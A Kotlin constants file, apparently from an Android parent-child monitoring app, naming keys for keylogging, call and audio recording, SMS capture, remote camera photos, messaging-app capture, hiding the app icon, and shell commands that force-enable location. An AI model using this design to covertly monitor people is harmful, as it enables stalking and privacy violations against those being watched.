package com.example.rule.dash.utils

import java.util.regex.Pattern
object Consts {

    const val TAG = "Dash"
    const val SIZE_CACHE_FIREBASE = 50000000L

    const val APP_ENABLED = 1
    const val APP_DISABLED = 2

    const val TYPE_CHILD = "Child"
    const val TYPE_PARENT = "Parent"

    const val USER = "user"

    const val NOTIFICATION_MESSAGE = "notificationsMessages"
    const val LOCATION = "location"
    const val CALLS = "calls"
    const val RECORDING = "recording"
    const val DATA = "data"
    const val SMS = "sms"
    const val KEY_LOGGER = "keyLogger"
    const val PHOTO = "photo"
    const val PARAMS = "params"
    const val TIMER = "timer"
    const val INTERVAL = "interval"

    const val SOCIAL = "social"
    const val CHILD_SOCIAL_MS = "ms"

    const val CHILD_PHOTO = "photoUrl"
    const val CHILD_NAME = "nameChild"
    const val DEVICE_NAME = "nameDevice"
    const val CHILD_SHOW_APP = "showApp"
    const val CHILD_GPS = "gpsEnable"
    const val CHILD_SERVICE_DATA = "serviceData"
    const val CHILD_PERMISSION = "permissionEnable"

    const val ADDRESS_AUDIO_CALLS = "audioCalls"
    const val ADDRESS_AUDIO_RECORD = "audioRecord"
    const val ADDRESS_IMAGE = "imageNotification"
    const val ADDRESS_PHOTO = "photos"

    const val REAR_FACING_CAMERA = 0
    const val FRONT_FACING_CAMERA = 1

    const val URL_IMAGE = "urlImage"

    const val KEY_TEXT = "keyText"

    const val CHILD_CAPTURE_PHOTO = "capturePhoto"

    const val TYPE_CALL_OUTGOING = 1
    const val TYPE_CALL_INCOMING = 2
    const val TYPE_CALL_INCOMING_WHATSCALL = 3

    const val TYPE_SMS = "smsType"
    const val TYPE_SMS_OUTGOING = 1
    const val TYPE_SMS_INCOMING = 2
    const val CALL_NOT_BLOCKED = 0
    const val CALL_BLOCKED = 1

    const val SMS_ADDRESS = "smsAddress"
    const val SMS_BODY = "smsBody"

    const val RESTART_MONITOR_RECEIVER ="com.example.rule.dash.receiver.RESTART_MONITOR_RECEIVER"

    const val FACEBOOK_MESSENGER_PACK_NAME = "com.facebook.orca"
    const val WHATSAPP_PACK_NAME = "com.whatsapp"
    const val INSTAGRAM_PACK_NAME = "com.instagram.android"

    const val TYPE_MESSENGER = 1
    const val TYPE_WHATSAPP = 2
    const val TYPE_INSTAGRAM = 3

    val TEXT : Pattern = Pattern.compile("^[a-zA-ZñÑЁёА-я]+\$")

    const val PERMISSION_USAGE_STATS = "android.permission.PACKAGE_USAGE_STATS"

    const val COMMAND_ENABLE_GPS_PROVIDER = "settings put secure location_providers_allowed +gps"
    const val COMMAND_ENABLE_NETWORK_PROVIDER = "settings put secure location_providers_allowed +network"

}